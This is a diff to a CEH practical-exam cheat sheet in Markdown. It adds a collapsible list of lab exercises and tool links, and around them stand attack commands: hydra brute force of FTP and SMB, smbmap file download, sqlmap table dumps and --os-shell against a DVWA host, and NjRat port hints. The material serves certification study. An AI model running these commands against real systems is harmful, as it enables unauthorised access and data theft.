@@ -12,60 +12,225 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 ## Notes/Exercises
 
+<details>
+
+<summary>Type of Exercises</summary>
+
 * What is the IP of the Windows X machine?
+
+<!---->
+
 * Find the IP address of the machine which is running the RDP?
+
+<!---->
+
 * What is the version of the Linux Kernel?
+
+<!---->
+
 * How many Windows machines are there?
+
+<!---->
+
 * Find the OS name of the machine which is running MySQL database?
+
+<!---->
+
 * What is the password for user X of the FTP server?
+
+<!---->
+
 * Find the HTTP method that poses a high risk to the application example.com?
+
+<!---->
+
 * What is user X's IBAN number?
+
+<!---->
+
 * Which user X's phone number?
+
+<!---->
+
 * Find the password of the wordpress user “Mario”?
+
+<!---->
+
 * What is the password hidden in the .jpeg file?
+
+<!---->
+
 * Rogue AP suspect, crack your password using capture.cap
+
+<!---->
+
 * Discovery RAT in Network and acess computer to recovery secret.txt
+
+<!---->
+
 * Find the attacker IP address who has launched the DOS attack?
+
+<!---->
+
 * Identify FQDN of Domain Controller
+
+<!---->
+
 * Find the username/password from the pcap file, which is in plain text?
+
+<!---->
+
 * Find the number of machines that were used to initiate the DDOS attack?
+
+<!---->
+
 * Find the file name which is tampered by comparing the hashes which is given in the /hashes folder?
+
+<!---->
+
 * Decrypt the volume file using veracrypt?
+
+<!---->
+
 * Decode the file which is encoded in DES(ECB) format?
+
+<!---->
+
 * Perform deep scan on the elf and obtain hash of the file with highest entropy value.
+
+<!---->
+
 * Connect to the Server remotely using the credentials give by RDP?
+
+<!---->
+
 * Find the executable's Entry point (Address)
+
+<!---->
+
 * Extract the information from the SDcard of the Android User?
+
+<!---->
+
 * Find the machines running MSSQL ?
+
+<!---->
+
 * Find DOS attacker ips from pcap file ?
+
+<!---->
+
 * Identify modifed text files , (hint : check integrity)
+
+<!---->
+
 * Crack MD5 Hashes.
+
+<!---->
+
 * Find attacker's username from machine?
+
+<!---->
+
 * Find contact details of Jenny ? (hint : dump the table using sqlmap)
+
+<!---->
+
 * Find username password ? (hint : Bruteforce using wpscan)
+
+<!---->
+
 * Use hydra to crack password
+
+<!---->
+
 * How many machines are active? Use netdiscover
+
+<!---->
+
 * Which machine has FTP Server open? Use nmap
+
+<!---->
+
 * Find 2 secret files using FTP? brute force FTP username and psw.
+
+<!---->
+
 * Find out phone number of Web application user? Use sqlmap
+
+<!---->
+
 * Brute force Wordpress  website user's psw? Use wpscan
+
+<!---->
+
 * Decode .hex file? Use Cryptool
+
+<!---->
+
 * Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file? Use wireshark
+
+<!---->
+
 * Decode the given text using given secret? Use BCTextEncorder
+
+<!---->
+
 * Calculate SHA1 hash of a text? Use Hashcalc
+
+<!---->
+
 * Decrypt the hidden vulume and find secret file? Use Veracrypt.
+
+<!---->
+
 * Crack the given hash? Use hashes.com
+
+<!---->
+
 * Find secret hidden int he image/file? Usen openstego/snow
+
+<!---->
+
 * Find a secret file in Android? Use ADB
+
+<!---->
+
 * Send data to another machine (firewall blocked)? Use Covert TCP.
+
+<!---->
+
 * Which username was tampered? ( You need to solving by comparing Hash values)
+
+<!---->
+
 * Wordpress Username Enumeration!
+
+<!---->
+
 * Retrieve Database names ( SQLi)
+
+<!---->
+
 * How many machines are there? ( NMAP)
+
+<!---->
+
 * Phone number of User X? ( Metasploit/Parameter Tampering)
+
+<!---->
+
 * What is the hidden text in X.jpeg (STEGHIDE)
+
+<!---->
+
 * Password crack for VCRYPT
+
+<!---->
+
 * IP Address/ Version of Running windows Server.
+
+</details>
 
 ## Nmap
 
@@ -228,6 +393,10 @@ and crack it using Hashcat or John
 * if we don't know username and psw: `hydra -L /user.txt -P password.txt ftp://IP` or `hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://IP` &#x20;
 * Login using FTP credentials obtained, get flag and cat it.
 
+{% content-ref url="../tools/hydra.md" %}
+[hydra.md](../tools/hydra.md)
+{% endcontent-ref %}
+
 ### **Crack the SMB credentials knowing username to obtain file stored into share**
 
 **Brute force smb login**
@@ -241,6 +410,8 @@ hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
 ```bash
 smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 ```
+
+
 
 ### **Entropy**
 
@@ -281,6 +452,10 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 * Get list of tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql --tables`
 * Dump data from tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql -T db --dump`
 * Get OS shell -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --os-shell`
+
+{% content-ref url="../tools/sqlmap.md" %}
+[sqlmap.md](../tools/sqlmap.md)
+{% endcontent-ref %}
 
 ### Perform an SQL injection attack on web application and retrieve psw of user Mario (you just know these credentials maria:ferrari10)
 
@@ -499,6 +674,14 @@ NjRat
 * Insert IP and Port
 * Click on manager and open directory
 
+{% hint style="info" %}
+Others possible ports can be: 5552, 9871, 6703.
+{% endhint %}
+
+{% content-ref url="../main-contents/7-malware.md" %}
+[7-malware.md](../main-contents/7-malware.md)
+{% endcontent-ref %}
+
 ## Aircrack-ng
 
 ### Crack the wireless encryption and identify the Wi-Fi password
@@ -642,7 +825,7 @@ The example below is given to complete the subject on the “find” command.
 search -f flag.txt
 ```
 
-## Others <a href="#effd" id="effd"></a>
+## Others resources <a href="#effd" id="effd"></a>
 
 ```
 >>>Module 02 : Enumeration 
@@ -867,4 +1050,3 @@ Your exam computers won't have regular internet access. You need to use your web
 * Scan all ports on IPs because default scripts might not catch smart configurations.
 
 </details>
-
